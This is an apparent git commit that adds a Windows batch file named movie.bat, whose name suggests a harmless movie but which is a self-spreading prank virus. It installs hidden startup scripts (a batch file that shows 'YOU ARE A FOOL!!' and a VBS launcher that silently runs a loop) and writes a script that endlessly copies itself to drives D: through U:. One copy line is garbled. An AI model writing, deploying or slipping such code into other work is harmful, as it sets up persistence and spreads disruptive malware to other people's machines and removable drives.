3104b4b378d187740493fc46a1a4ef891b79088b
dillibabupec <dillibabu_it@panimalar.ac.in>
2024-07-09 11:11:04 +0530

    Add files via upload

---
+++ movie.bat
@@ -0,0 +1,32 @@
+@echo off
+(echo @echo off
+echo color 1a
+echo title @VIRUS = HR
+echo echo YOU ARE A FOOL!!
+echo pause)>"%appdata%\Microsoft\windows\start menu\Programs\Startup\system.bat"
+(echo @echo off
+echo :A
+echo copy /y %appdata%\movie.bat d:
+echo copy /y %appdata%\movie.bat e:
+echo copy /y %appdata%\movie.bat f:
+echo copy /y %appdata%\movie.bat g:
+echo copy /y %appdata%\movie.bat h:
+echo copy /y %appdata%\movie.bat i:
+echo copy /y %appdata%\movie.bat j:
+echo copy /y %appdata%\movie.bat k:
+echo copyta%\ /y %appdata%\movie.bat l:
+echo copy /y %appdata%\movie.bat m:
+echo copy /y %appdata%\movie.bat n:
+echo copy /y %appdata%\movie.bat o:
+echo copy /y %appdata%\movie.bat p:
+echo copy /y %appdata%\movie.bat q:
+echo copy /y %appdata%\movie.bat r:
+echo copy /y %appdata%\movie.bat s:
+echo copy /y %appdata%\movie.bat t:
+echo copy /y %appdata%\movie.bat u:
+echo goto A)>"%appdata%\vol.bat"
+(echo Set WshShell = CreateObject^("WScript.Shell"^)
+echo WshShell.Run chr^(34^) ^& "%appdata%\vol.bat" ^& Chr^(34^), 0
+echo Set WshShell = Nothing) > "%appdata%\Microsoft\windows\start menu\Programs\startup\windows.vbs"
+copy movie.bat %appdata%
+
